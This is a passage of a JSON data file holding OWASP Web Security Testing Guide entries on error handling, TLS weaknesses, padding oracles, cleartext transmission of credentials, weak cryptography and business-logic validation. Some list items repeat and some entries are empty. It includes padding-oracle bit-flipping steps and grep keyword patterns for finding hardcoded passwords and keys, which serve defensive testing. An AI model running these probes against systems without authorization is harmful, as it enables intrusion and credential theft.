        "remediation": "<h3>Remediation</h3><p>Use built-in features, provided by frameworks, to define bindable and non-bindable fields. An approach based on allowed fields (bindable), in which only the properties that should be updated by the user are explicitly defined, is preferable.\nAn architectural approach to prevent the issue is to use the Data Transfer Object (DTO) pattern in order to avoid direct binding. The DTO should include only the fields that are meant to be editable by the user.</p><h3>References</h3><ul><li>OWASP: API Security</li><li>OWASP: Cheat Sheet Series</li><li>CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ERRH-01": {
        "summary": "<h3>Summary</h3><p>All types of applications (web apps, web servers, databases, etc.) will generate errors for various reasons. Developers often ignore handling these errors, or push away the idea that a user will ever try to trigger an error purposefully ( e.g. sending a string where an integer is expected). When the developer only consider the happy path, they forget all other possible user-input the code can receive but can’t handle.</p><p>Errors sometimes rise as:</p><ul><li>stack traces,</li><li>network timeouts,</li><li>input mismatch,</li><li>and memory dumps.</li></ul><p>Improper error handling can allow attackers to:</p><ul><li>Understand the APIs being used internally.</li><li>Map the various services integrating with each other by gaining insight on internal systems and frameworks used, which opens up doors to attack chaining.</li><li>Gather the versions and types of applications being used.</li><li>DoS the system by forcing the system into a deadlock or an unhandled exception that sends a panic signal to the engine running it.</li><li>Controls bypass where a certain exception is not restricted by the logic set around the happy path.</li></ul><h3>Test Objectives</h3><ul><li>Identify existing error output.</li><li>Analyze the different output returned.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Errors are usually seen as benign as they provide diagnostics data and messages that could help the user understand the problem at hand, or for the developer to debug that error.</p><p>By trying to send unexpected data, or forcing the system into certain edge cases and scenarios, the system or application will, most of the time, give out a bit on what’s happening internally, unless the developers turned off all possible errors and return a certain custom message.</p><p>All web apps run on a web server, whether it was an integrated one or a fully fledged one. Web apps must handle and parse HTTP requests, and for that a web server is always part of the stack. Some of the most famous web servers are Nginx, Apache, and IIS.</p><p>Web servers have known error messages and formats. If one is not familiar with how they look, searching online for them would provide examples. Another way would be to look into their documentation, or simply setup a server locally and discover the errors by going through the pages that the web server uses.</p><p>In order to trigger error messages, a tester must:</p><ul><li>Search for random files and folders that will not be found (404s).</li><li>Try to request folders that exist and see the server behavior (403s, blank page, or directory listing).</li><li>Try sending a request that breaks theHTTP RFC. One example would be to send a very large path, break the headers format, or change the HTTP version.Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.</li><li>Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.</li></ul><ul><li>Even if errors are handled on the application level, breaking the HTTP RFC may make the integrated web server show itself since it has to handle the request, and developers forget to override these errors.</li></ul><p>Applications are the most susceptible to let out a wide variety of error messages, which include: stack traces, memory dumps, mishandled exceptions, and generic errors. This happens due to the fact that applications are custom built most of the time and the developers need to observe and handle all possible error cases (or have a global error catching mechanism), and these errors can appear from integrations with other services.</p><p>In order to make an application throw these errors, a tester must:</p><ul><li>Fuzzing every input with all possible injections is not the best solution unless you have unlimited testing time and the application can handle that much input.</li><li>If fuzzing isn’t an option, handpick viable inputs that have the highest chance to break a certain parser (e.g.a closing bracket for a JSON body, a large text where only a couple of characters are expected, CLRF injection with parameters that might be parsed by servers and input validation controls, special characters that aren’t applicable for filenames, etc.).</li><li>Fuzzing with jargon data should be ran for every type as sometimes the interpreters will break outside of the developer’s exception handling.</li></ul><p>Error messages are sometimes the main weakness in mapping out systems, especially under a microservice architecture. If services are not properly set to handle errors in a generic and uniform manner, error messages would let a tester identify which service handles which requests, and allows for a more focused attack per service.</p><p>The tester needs to keep a vigilant eye for the response type. Sometimes errors are returned as success with an error body, hide the error in a 302, or simply by having a custom way of representing that error.</p>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>For remediation, check out the Proactive Controls C10 and the Error Handling Cheat Sheet .</p><h3>Playgrounds</h3><ul><li>Juice Shop - Error Handling</li></ul><h3>References</h3><ul><li>WSTG: Appendix C - Fuzzing</li><li>Proactive Controls C10: Handle All Errors and Exceptions</li><li>ASVS v4.1 v7.4: Error handling</li><li>CWE 728 - Improper Error Handling</li><li>Cheat Sheet Series: Error Handling</li></ul>",
        "test_objectives": ""
    },
    "WSTG-ERRH-02": {
        "summary": "",
        "how-to": "",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CRYP-01": {
        "summary": "<h3>Summary</h3><p>When information is sent between the client and the server, it must be encrypted and protected in order to prevent an attacker from being able to read or modify it. This is most commonly done using HTTPS, which uses the Transport Layer Security (TLS) protocol, a replacement for the older Secure Socket Layer (SSL) protocol. TLS also provides a way for the server to demonstrate to the client that they have connected to the correct server, by presenting a trusted digital certificate.</p><p>Over the years there have been a large number of cryptographic weaknesses identified in the SSL and TLS protocols, as well as in the ciphers that they use. Additionally, many of the implementations of these protocols have also had serious vulnerabilities. As such, it is important to test that sites are not only implementing TLS, but that they are doing so in a secure manner.</p><h3>Test Objectives</h3><ul><li>Validate the service configuration.</li><li>Review the digital certificate’s cryptographic strength and validity.</li><li>Ensure that the TLS security is not bypassable and is properly implemented across the application.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Transport layer security related issues can be broadly split into the following areas:</p><p>There are a large number of protocol versions, ciphers, and extensions supported by TLS. Many of these are considered to be legacy, and have cryptographic weaknesses, such as those listed below. Note that new weaknesses are likely to be identified over time, so this list may be incomplete.</p><ul><li>SSLv2 (DROWN)</li><li>SSLv3 (POODLE)</li><li>TLSv1.0 (BEAST)</li><li>TLSv1.1 (Deprecated by RFC 8996)</li><li>EXPORT ciphers suites (FREAK)</li><li>NULL ciphers(they only provide authentication).</li><li>Anonymous ciphers (these may be supported on SMTP servers, as discussed inRFC 7672)</li><li>RC4 ciphers (NOMORE)</li><li>CBC mode ciphers (BEAST,Lucky 13)</li><li>TLS compression (CRIME)</li><li>Weak DHE keys (LOGJAM)</li></ul><p>The Mozilla Server Side TLS Guide details the protocols and ciphers that are currently recommended.</p><p>It should be emphasised that while many of these attacks have been demonstrated in a lab environment, they are not generally considered practical to exploit in the real world, as they require a (usually active) MitM attack, and significant resources. As such, they are unlikely to be exploited by anyone other than nation states.</p><p>From a cryptographic perspective, there are two main areas that need to be reviewed on a digital certificate:</p><ul><li>The key strength should beat least2048 bits.</li><li>The signature algorithm should beat leastSHA-256. Legacy algorithms such as MD5 and SHA-1 should not be used.</li></ul><p>As well as being cryptographically secure, the certificate must also be considered valid (or trusted). This means that it must:</p><ul><li>Be within the defined validity period.Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than398 days.</li><li>Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than398 days.</li><li>Be signed by a trusted certificate authority (CA).This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.Don’t flag internal applications as having untrusted certificates just becauseyoursystem doesn’t trust the CA.</li><li>This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.</li><li>Don’t flag internal applications as having untrusted certificates just becauseyoursystem doesn’t trust the CA.</li><li>Have a Subject Alternate Name (SAN) that matches the hostname of the system.The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.Make sure that you’re accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).</li><li>The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.</li><li>Make sure that you’re accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).</li></ul><ul><li>Any certificates issued after 1st September 2020 must not have a maximum lifespan of more than398 days.</li></ul><ul><li>This should either be a trusted public CA for externally facing applications, or an internal CA for internal applications.</li><li>Don’t flag internal applications as having untrusted certificates just becauseyoursystem doesn’t trust the CA.</li></ul><ul><li>The Common Name (CN) field is ignored by modern browsers, which only look at the SAN.</li><li>Make sure that you’re accessing the system with the correct name (for example, if you access the host by IP then any certificate will be appear untrusted).</li></ul><p>Some certificates may be issued for wildcard domains (such as *.example.org ), meaning that they can be valid for multiple subdomains. Although convenient, there are a number of security concerns around this that should be considered. These are discussed in the OWASP Transport Layer Security Cheat Sheet .</p><p>Certificates can also leak information about internal systems or domain names in the Issuer and SAN fields, which can be useful when trying to build up a picture of the internal network or conduct social engineering activities.</p><p>Over the years there have been vulnerabilities in the various TLS implementations. There are too many to list here, but some of the key examples are:</p><ul><li>Debian OpenSSL Predictable Random Number Generator(CVE-2008-0166)</li><li>OpenSSL Insecure Renegotiation(CVE-2009-3555)</li><li>OpenSSL Heartbleed(CVE-2014-0160)</li><li>F5 TLS POODLE(CVE-2014-8730)</li><li>Microsoft Schannel Denial of Service(MS14-066 / CVE-2014-6321)</li></ul><p>As well as the underlying TLS configuration being securely configured, the application also needs to use it in a secure way. Some of these points are addressed elsewhere in this guide:</p><ul><li>Not sending sensitive data over unencrypted channels (WSTG-CRYP-03)</li><li>Setting the HTTP Strict-Transport-Security header (WSTG-CONF-07)</li><li>Setting the Secure flag on cookies (WSTG-SESS-02)</li></ul><p>Mixed active content is when active resources (such as scripts to CSS) are loaded over unencrypted HTTP and included into a secure (HTTPS) page. This is dangerous because it would allow an attacker to modify these files (as they are sent unencrypted), which could allow them to execute arbitrary code (JavaScript or CSS) in the page. Passive content (such as images) loaded over an insecure connection can also leak information or allow an attacker to deface the page, although it is less likely to lead to a full compromise.</p><p>Note: modern browsers will block active content being loaded from insecure sources into secure pages.</p><p>Many sites will accept connections over unencrypted HTTP, and then immediately redirect the user to the secure (HTTPS) version of the site with a 301 Moved Permanently redirect. The HTTPS version of the site then sets the Strict-Transport-Security header to instruct the browser to always use HTTPS in future.</p><p>However, if an attacker is able to intercept this initial request, they could redirect the user to a malicious site, or use a tool such as sslstrip to intercept subsequent requests.</p><p>In order to defend against this type of attack, the site must use be added to the preload list .</p><h3>Automated Testing</h3><p>There are a large number of scanning tools that can be used to identify weaknesses in the SSL/TLS configuration of a service, including both dedicated tools and general purpose vulnerability scanners. Some of the more popular ones are:</p><ul><li>Nmap(various scripts)</li><li>OWASP O-Saft</li><li>sslscan</li><li>sslyze</li><li>SSL Labs</li><li>testssl.sh</li></ul><p>It is also possible to carry out most checks manually, using command-line looks such as openssl s_client or gnutls-cli to connect with specific protocols, ciphers or options.</p><p>When testing like this, be aware that the version of OpenSSL or GnuTLS shipped with most modern systems may will not support some outdated and insecure protocols such as SSLv2 or EXPORT ciphers. Make sure that your version supports the outdated versions before using it for testing, or you’ll end up with false negatives.</p><p>It can also be possible to performed limited testing using a web browser, as modern browsers will provide details of the protocols and ciphers that are being used in their developer tools. They also provide an easy way to test whether a certificate is considered trusted, by browsing to the service and seeing if you are presented with a certificate warning.</p><h3>References</h3><ul><li>OWASP Transport Layer Protection Cheat Sheet</li><li>Mozilla Server Side TLS Guide</li></ul>",
        "tools": "",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CRYP-02": {
        "summary": "<h3>Summary</h3><p>A padding oracle is a function of an application which decrypts encrypted data provided by the client, e.g. internal session state stored on the client, and leaks the state of the validity of the padding after decryption. The existence of a padding oracle allows an attacker to decrypt encrypted data and encrypt arbitrary data without knowledge of the key used for these cryptographic operations. This can lead to leakage of sensitive data or to privilege escalation vulnerabilities, if integrity of the encrypted data is assumed by the application.</p><p>Block ciphers encrypt data only in blocks of certain sizes. Block sizes used by common ciphers are 8 and 16 bytes. Data where the size doesn’t match a multiple of the block size of the used cipher has to be padded in a specific manner so the decryptor is able to strip the padding. A commonly used padding scheme is PKCS#7. It fills the remaining bytes with the value of the padding length.</p><p>If the padding has the length of 5 bytes, the byte value 0x05 is repeated five times after the plain text.</p><p>An error condition is present if the padding doesn’t match the syntax of the used padding scheme. A padding oracle is present if an application leaks this specific padding error condition for encrypted data provided by the client. This can happen by exposing exceptions (e.g. BadPaddingException in Java) directly, by subtle differences in the responses sent to the client or by another side-channel like timing behavior.</p><p>Certain modes of operation of cryptography allow bit-flipping attacks, where flipping of a bit in the cipher text causes that the bit is also flipped in the plain text. Flipping a bit in the n-th block of CBC encrypted data causes that the same bit in the (n+1)-th block is flipped in the decrypted data. The n-th block of the decrypted cipher text is garbaged by this manipulation.</p><p>The padding oracle attack enables an attacker to decrypt encrypted data without knowledge of the encryption key and used cipher by sending skillful manipulated cipher texts to the padding oracle and observing of the results returned by it. This causes loss of confidentiality of the encrypted data. E.g. in the case of session data stored on the client-side the attacker can gain information about the internal state and structure of the application.</p><p>A padding oracle attack also enables an attacker to encrypt arbitrary plain texts without knowledge of the used key and cipher. If the application assumes that integrity and authenticity of the decrypted data is given, an attacker could be able to manipulate internal session state and possibly gain higher privileges.</p><h3>Test Objectives</h3><ul><li>Identify encrypted messages that rely on padding.</li><li>Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>First the possible input points for padding oracles must be identified. Generally the following conditions must be met:</p><p>Dg6W8OiWMIdVokIDH15T/A== results after base64 decoding in 0e 0e 96 f0 e8 96 30 87 55 a2 42 03 1f 5e 53 fc . This seems to be random and 16 byte long.</p><p>If such an input value candidate is identified, the behavior of the application to bit-wise tampering of the encrypted value should be verified. Normally this base64 encoded value will include the initialization vector (IV) prepended to the cipher text. Given a plaintext p and a cipher with a block size n , the number of blocks will be b = ceil( length(p) / n) . The length of the encrypted string will be y=(b+1)*n due to the initialization vector. To verify the presence of the oracle, decode the string, flip the last bit of the second-to-last block b-1 (the least significant bit of the byte at y-n-1 ), re-encode and send. Next, decode the original string, flip the last bit of the block b-2 (the least significant bit of the byte at y-2*n-1 ), re-encode and send.</p><p>If it is known that the encrypted string is a single block (the IV is stored on the server or the application is using a bad practice hardcoded IV), several bit flips must be performed in turn. An alternative approach could be to prepend a random block, and flip bits in order to make the last byte of the added block take all possible values (0 to 255).</p><p>The tests and the base value should at least cause three different states while and after decryption:</p><ul><li>Cipher text gets decrypted, resulting data is correct.</li><li>Cipher text gets decrypted, resulting data is garbled and causes some exception or error handling in the application logic.</li><li>Cipher text decryption fails due to padding errors.</li></ul><p>Compare the responses carefully. Search especially for exceptions and messages which state that something is wrong with the padding. If such messages appear, the application contains a padding oracle. If the three different states described above are observable implicitly (different error messages, timing side-channels), there is a high probability that there is a padding oracle present at this point. Try to perform the padding oracle attack to ensure this.</p><ul><li>ASP.NET throwsSystem.Security.Cryptography.CryptographicException: Padding is invalid and cannot be removed.if padding of a decrypted cipher text is broken.</li><li>In Java ajavax.crypto.BadPaddingExceptionis thrown in this case.</li><li>Decryption errors or similar can be possible padding oracles.</li></ul><p>A secure implementation will check for integrity and cause only two responses: ok and failed . There are no side channels which can be used to determine internal error states.</p><p>Verify that all places where encrypted data from the client, that should only be known by the server, is decrypted. The following conditions should be met by such code:</p><p>Visualization of the decryption process</p>",
        "tools": "<h3>Tools</h3><ul><li>Bletchley</li><li>PadBuster</li><li>Poracle</li><li>python-paddingoracle</li></ul><h3>References</h3><ul><li>Wikipedia - Padding Oracle Attack</li><li>Juliano Rizzo, Thai Duong, “Practical Padding Oracle Attacks”</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-CRYP-03": {
        "summary": "<h3>Summary</h3><p>Sensitive data must be protected when it is transmitted through the network. If data is transmitted over HTTPS or encrypted in another way the protection mechanism must not have limitations or vulnerabilities, as explained in the broader article Testing for Weak Transport Layer Security and in other OWASP documentation:</p><ul><li>OWASP Top 10 2017 A3-Sensitive Data Exposure.</li><li>OWASP ASVS - Verification V9.</li><li>Transport Layer Protection Cheat Sheet.</li></ul><p>As a rule of thumb if data must be protected when it is stored, this data must also be protected during transmission. Some examples for sensitive data are:</p><ul><li>Information used in authentication (e.g. Credentials, PINs, Session identifiers, Tokens, Cookies…)</li><li>Information protected by laws, regulations or specific organizational policy (e.g. Credit Cards, Customers data)</li></ul><p>If the application transmits sensitive information via unencrypted channels - e.g. HTTP - it is considered a security risk. Attackers can take over accounts by sniffing network traffic . Some examples are Basic authentication which sends authentication credentials in plain-text over HTTP, form based authentication credentials sent via HTTP, or plain-text transmission of any other information considered sensitive due to regulations, laws, organizational policy or application business logic.</p><p>Examples for Personal Identifying Information (PII) are:</p><ul><li>Social security numbers</li><li>Bank account numbers</li><li>Passport information</li><li>Healthcare related information</li><li>Medical insurance information</li><li>Student information</li><li>Credit and debit card numbers</li><li>Driver’s license and State ID information</li></ul><h3>Test Objectives</h3><ul><li>Identify sensitive information transmitted through the various channels.</li><li>Assess the privacy and security of the channels used.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Various types of information that must be protected, could be transmitted by the application in clear text. To check if this information is transmitted over HTTP instead of HTTPS, capture traffic between a client and web application server that needs credentials. For any message containing sensitive data, verify the exchange occurred using HTTPS. See more information about insecure transmission of credentials OWASP Top 10 2017 A3-Sensitive Data Exposure or Transport Layer Protection Cheat Sheet .</p><p>A typical example is the usage of Basic Authentication over HTTP. When using Basic Authentication, user credentials are encoded rather than encrypted, and are sent as HTTP headers. In the example below the tester uses curl to test for this issue. Note how the application uses Basic authentication, and HTTP rather than HTTPS.</p><pre><code>$ curl -kis http://example.com/restricted/\nHTTP/1.1 401 Authorization Required\nDate: Fri, 01 Aug 2013 00:00:00 GMT\nWWW-Authenticate: Basic realm = \"Restricted Area\" Accept-Ranges: bytes Vary:\nAccept-Encoding Content-Length: 162\nContent-Type: text/html\n\n<html>< head > <title>401 Authorization Required</title></head>\n<body bgcolor = white> <h1>401 Authorization Required</h1>  Invalid login credentials!  </body></html></code></pre><p>Another typical example is authentication forms which transmit user authentication credentials over HTTP. In the example below one can see HTTP being used in the action attribute of the form. It is also possible to see this issue by examining the HTTP traffic with an interception proxy.</p><pre><code><form action= \"http://example.com/login\" > <label for= \"username\" > User: </label> <input type= \"text\" id= \"username\" name= \"username\" value= \"\" /><br /> <label for= \"password\" > Password: </label> <input type= \"password\" id= \"password\" name= \"password\" value= \"\" /> <input type= \"submit\" value= \"Login\" /> </form></code></pre><p>The Session ID Cookie must be transmitted over protected channels. If the cookie does not have the secure flag set, it is permitted for the application to transmit it unencrypted. Note below the setting of the cookie is done without the Secure flag, and the entire log in process is performed in HTTP and not HTTPS.</p><pre><code>https://secure.example.com/login POST /login HTTP / 1.1 Host : secure.example.com [...] Referer : https://secure.example.com/ Content-Type : application/x-www-form-urlencoded Content-Length : 188 HTTP/1.1 302 Found\nDate: Tue, 03 Dec 2013 21:18:55 GMT\nServer: Apache\nSet-Cookie: JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; expires=Fri, 01-Jan-2014 00:00:00 GMT; path=/; domain=example.com; httponly\nLocation: private/\nContent-Length: 0\nContent-Type: text/html</code></pre><pre><code>http://example.com/private GET /private HTTP / 1.1 Host : example.com [...] Referer : https://secure.example.com/login Cookie : JSESSIONID=BD99F321233AF69593EDF52B123B5BDA; HTTP/1.1 200 OK\nContent-Type: text/html;charset=UTF-8\nContent-Length: 730\nDate: Tue, 25 Dec 2013 00:00:00 GMT</code></pre><p>If the web application has features that allow a user to change an account or call a different service with credentials, verify all of those interactions use HTTPS. The interactions to test include the following:</p><ul><li>Forms that allow users to handle a forgotten password or other credentials</li><li>Forms that allow users to edit credentials</li><li>Forms that require the user to authenticate with another provider (for example, payment processing)</li></ul><p>Use one of the following techniques to search for sensitive information.</p><p>Checking if password or encryption key is hardcoded in the source code or configuration files.</p><p>grep -r –E \"Pass | password | pwd |user | guest| admin | encry | key | decrypt | sharekey \" ./PathToSearch/</p><p>Checking if logs or source code may contain phone number, email address, ID or any other PII. Change the regular expression based on the format of the PII.</p><p>grep -r \" {2\\}[0-9]\\{6\\} \"  ./PathToSearch/</p>",
        "tools": "<h3>Tools</h3><ul><li>curl</li><li>grep</li><li>Wireshark</li><li>TCPDUMP</li></ul><h3>References</h3><ul><li>OWASP Insecure Transport</li><li>OWASP HTTP Strict Transport Security Cheat Sheet</li><li>Let’s Encrypt</li></ul>",
        "remediation": "<h3>Remediation</h3><p>Use HTTPS for the whole web site and redirect any HTTP requests to HTTPS.</p>",
        "test_objectives": ""
    },
    "WSTG-CRYP-04": {
        "summary": "<h3>Summary</h3><p>Incorrect uses of encryption algorithms may result in sensitive data exposure, key leakage, broken authentication, insecure session, and spoofing attacks. There are some encryption or hash algorithms known to be weak and are not suggested for use such as MD5 and RC4.</p><p>In addition to the right choices of secure encryption or hash algorithms, the right uses of parameters also matter for the security level. For example, ECB (Electronic Code Book) mode generally should not be used.</p><h3>Test Objectives</h3><ul><li>Provide a guideline for the identification weak encryption or hashing uses and implementations.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>When using AES128 or AES256, the IV (Initialization Vector) must be random and unpredictable. Refer toFIPS 140-2, Security Requirements for Cryptographic Modules, section 4.9.1. random number generator tests. For example, in Java,java.util.Randomis considered a weak random number generator.java.security.SecureRandomshould be used instead ofjava.util.Random.</li><li>For asymmetric encryption, use Elliptic Curve Cryptography (ECC) with a secure curve likeCurve25519preferred.If ECC can’t be used then use RSA encryption with a minimum 2048bit key.</li><li>If ECC can’t be used then use RSA encryption with a minimum 2048bit key.</li><li>When uses of RSA in signature, PSS padding is recommended.</li><li>Weak hash/encryption algorithms should not be used such MD5, RC4, DES, Blowfish, SHA1. 1024-bit RSA or DSA, 160-bit ECDSA (elliptic curves), 80/112-bit 2TDEA (two key triple DES)</li><li>Minimum Key length requirements:</li></ul><ul><li>If ECC can’t be used then use RSA encryption with a minimum 2048bit key.</li></ul><pre><code>Key exchange: Diffie–Hellman key exchange with minimum 2048 bits\nMessage Integrity: HMAC-SHA2\nMessage Hash: SHA2 256 bits\nAsymmetric encryption: RSA 2048 bits\nSymmetric-key algorithm: AES 128 bits\nPassword Hashing: PBKDF2, Scrypt, Bcrypt\nECDH, ECDSA: 256 bits</code></pre><ul><li>Uses of SSH, CBC mode should not be used.</li><li>When symmetric encryption algorithm is used, ECB (Electronic Code Book) mode should not be used.</li><li>When PBKDF2 is used to hash password, the parameter of iteration is recommended to be over 10000.NISTalso suggests at least 10,000 iterations of the hash function. In addition, MD5 hash function is forbidden to be used with PBKDF2 such as PBKDF2WithHmacMD5.</li></ul><ul><li>Search for the following keywords to identify use of weak algorithms:MD4, MD5, RC4, RC2, DES, Blowfish, SHA-1, ECB</li><li>For Java implementations, the following API is related to encryption. Review the parameters of the encryption implementation. For example,</li></ul><p>Search for the following keywords to identify use of weak algorithms: MD4, MD5, RC4, RC2, DES, Blowfish, SHA-1, ECB</p><p>For Java implementations, the following API is related to encryption. Review the parameters of the encryption implementation. For example,</p><pre><code>SecretKeyFactory ( SecretKeyFactorySpi keyFacSpi , Provider provider , String algorithm ) SecretKeySpec ( byte [] key , int offset , int len , String algorithm ) Cipher c = Cipher . getInstance ( \"DES/CBC/PKCS5Padding\" );</code></pre><ul><li>For RSA encryption, the following padding modes are suggested.</li></ul><pre><code>RSA/ECB/OAEPWithSHA-1AndMGF1Padding (2048)\nRSA/ECB/OAEPWithSHA-256AndMGF1Padding (2048)</code></pre><ul><li>Search forECB, it’s not allowed to be used in padding.</li><li>Review if different IV (initial Vector) is used.</li></ul><pre><code>// Use a different IV value for every encryption byte [] newIv = ...; s = new GCMParameterSpec ( s . getTLen (), newIv ); cipher . init (..., s ); ...</code></pre><ul><li>Search forIvParameterSpec, check if the IV value is generated differently and randomly.</li></ul><pre><code>IvParameterSpec iv = new IvParameterSpec ( randBytes ); SecretKeySpec skey = new SecretKeySpec ( key . getBytes (), \"AES\" ); Cipher cipher = Cipher . getInstance ( \"AES/CBC/PKCS5Padding\" ); cipher . init ( Cipher . ENCRYPT_MODE , skey , iv );</code></pre><ul><li>In Java, search for MessageDigest to check if weak hash algorithm (MD5 or CRC) is used. For example:</li></ul><p>MessageDigest md5 = MessageDigest.getInstance(\"MD5\");</p><ul><li>For signature, SHA1 and MD5 should not be used. For example:</li></ul><p>Signature sig = Signature.getInstance(\"SHA1withRSA\");</p><ul><li>Search forPBKDF2. To generate the hash value of password,PBKDF2is suggested to be used. Review the parameters to generate thePBKDF2has value.</li></ul><p>The iterations should be over 10000 , and the salt value should be generated as random value .</p><pre><code>private static byte [] pbkdf2 ( char [] password , byte [] salt , int iterations , int bytes ) throws NoSuchAlgorithmException , InvalidKeySpecException { PBEKeySpec spec = new PBEKeySpec ( password , salt , iterations , bytes * 8 ); SecretKeyFactory skf = SecretKeyFactory . getInstance ( PBKDF2_ALGORITHM ); return skf . generateSecret ( spec ). getEncoded (); }</code></pre><ul><li>Hard-coded sensitive information:</li></ul><pre><code>User related keywords: name, root, su, sudo, admin, superuser, login, username, uid\nKey related keywords: public key, AK, SK, secret key, private key, passwd, password, pwd, share key, shared key, cryto, base64\nOther common sensitive keywords: sysadmin, root, privilege, pass, key, code, master, admin, uname, session, token, Oauth, privatekey, shared secret</code></pre>",
        "tools": "<h3>Tools</h3><ul><li>Vulnerability scanners such as Nessus, NMAP (scripts), or OpenVAS can scan for use or acceptance of weak encryption against protocol such as SNMP, TLS, SSH, SMTP, etc.</li><li>Use static code analysis tool to do source code review such as klocwork, Fortify, Coverity, CheckMark for the following cases.</li></ul><pre><code>CWE-261: Weak Cryptography for Passwords\nCWE-323: Reusing a Nonce, Key Pair in Encryption\nCWE-326: Inadequate Encryption Strength\nCWE-327: Use of a Broken or Risky Cryptographic Algorithm\nCWE-328: Reversible One-Way Hash\nCWE-329: Not Using a Random IV with CBC Mode\nCWE-330: Use of Insufficiently Random Values\nCWE-347: Improper Verification of Cryptographic Signature\nCWE-354: Improper Validation of Integrity Check Value\nCWE-547: Use of Hard-coded, Security-relevant Constants\nCWE-780: Use of RSA Algorithm without OAEP</code></pre><h3>References</h3><ul><li>NIST FIPS Standards</li><li>Wikipedia: Initialization Vector</li><li>Secure Coding - Generating Strong Random Numbers</li><li>Optimal Asymmetric Encryption Padding</li><li>Cryptographic Storage Cheat Sheet</li><li>Password Storage Cheat Sheet</li><li>Secure Coding - Do not use insecure or weak cryptographic algorithms</li><li>Insecure Randomness</li><li>Insufficient Entropy</li><li>Insufficient Session-ID Length</li><li>Using a broken or risky cryptographic algorithm</li><li>Javax.crypto.cipher API</li><li>ISO 18033-1:2015 – Encryption Algorithms</li><li>ISO 18033-2:2015 – Asymmetric Ciphers</li><li>ISO 18033-3:2015 – Block Ciphers</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-BUSL-01": {
        "summary": "<h3>Summary</h3><p>The application must ensure that only logically valid data can be entered at the frontend as well as directly to the server-side of an application or system. Only verifying data on the client/frontend may leave applications vulnerable to server injections through proxies or at handoffs with other systems. This is different from simply performing Boundary Value Analysis (BVA) in that it is more difficult and in most cases cannot be simply verified at the entry point, but usually requires checking some other system.</p><p>For example: An application may ask for your Social Security Number. In BVA, the application should check formats and semantics (is the value 9 digits long, not negative, and not all 0’s) for the data entered, but there are logic considerations also. SSNs are grouped and categorized. Is this person on a death file? Are they from a certain part of the country?</p><p>Vulnerabilities related to business data validation is unique in that they are application specific and different from the vulnerabilities related to forging requests in that they are more concerned about logical data as opposed to simply breaking the business logic workflow.</p><p>The frontend and the backend of the application should be verifying and validating that the data it has, is using, and is passing along is logically valid. Even if the user provides valid data to an application the business logic may make the application behave differently depending on data or circumstances.</p><p>Suppose you manage a multi-tiered e-commerce site that allows users to order carpet. The user selects their carpet, enters the size, makes the payment, and the frontend application has verified that all entered information is correct and valid for contact information, size, make and color of the carpet. But, the business logic in the background has two paths, if the carpet is in stock it is directly shipped from your warehouse, but if it is out of stock in your warehouse a call is made to a partner’s system and if they have it in-stock they will ship the order from their warehouse and reimbursed by them. What happens if an attacker is able to continue a valid in-stock transaction and send it as out-of-stock to your partner? What happens if an attacker is able to get in the middle and send messages to the partner warehouse ordering carpet without payment?</p><p>Many credit card systems are now downloading account balances nightly so the customers can check out more quickly for amounts under a certain value. The inverse is also true. If I pay my credit card off in the morning I may not be able to use the available credit in the evening. Another example may be if I use my credit card at multiple locations very quickly it may be possible to exceed my limit if the systems are basing decisions on last night’s data.</p><p>Distributed Denial of Dollar (DDo$) : This was a campaign that was proposed by the founder of the site “The Pirate Bay” against the law firm who brought prosecutions against “The Pirate Bay”. The goal was to take advantage of errors in the design of business features and in the process of credit transfer validation.</p><p>This attack was performed by sending very small amounts of money of 1 SEK ($0.13 USD) to the law firm.\nThe bank account to which the payments were directed had only 1000 free transfers, after which any transfers have a surcharge for the account holder (2 SEK). After the first thousand internet transactions every 1 SEK donation to the law firm will actually end up costing it 1 SEK instead.</p><h3>Test Objectives</h3><ul><li>Identify data injection points.</li><li>Validate that all checks are occurring on the backend and can’t be bypassed.</li><li>Attempt to break the format of the expected data and analyze how the application is handling it.</li></ul>",
        "how-to": "<h3>How to Test</h3><ul><li>Review the project documentation and use exploratory testing looking for data entry points or hand off points between systems or software.</li><li>Once found try to insert logically invalid data into the application/system.\nSpecific Testing Method:</li><li>Perform frontend GUI Functional Valid testing on the application to ensure that the only “valid” values are accepted.</li><li>Using an intercepting proxy observe the HTTP POST/GET looking for places that variables such as cost and quantity are passed. Specifically, look for “hand-offs” between application/systems that may be possible injection or tamper points.</li><li>Once variables are found start interrogating the field with logically “invalid” data, such as social security numbers or unique identifiers that do not exist or that do not fit the business logic. This testing verifies that the server functions properly and does not accept logically invalid data.</li></ul><h3>Related Test Cases</h3><ul><li>AllInput Validationtest cases.</li><li>Testing for Account Enumeration and Guessable User Account.</li><li>Testing for Bypassing Session Management Schema.</li><li>Testing for Exposed Session Variables.</li></ul>",
        "tools": "<h3>Tools</h3><ul><li>Zed Attack Proxy (ZAP)</li><li>Burp Suite</li></ul><h3>References</h3><ul><li>OWASP Proactive Controls (C5) - Validate All Inputs</li><li>OWASP Cheat Sheet Series - Input_Validation_Cheat_Sheet</li></ul>",
        "remediation": "<h3>Remediation</h3><p>The application/system must ensure that only “logically valid” data is accepted at all input and hand off points of the application or system and data is not simply trusted once it has entered the system.</p>",
        "test_objectives": ""
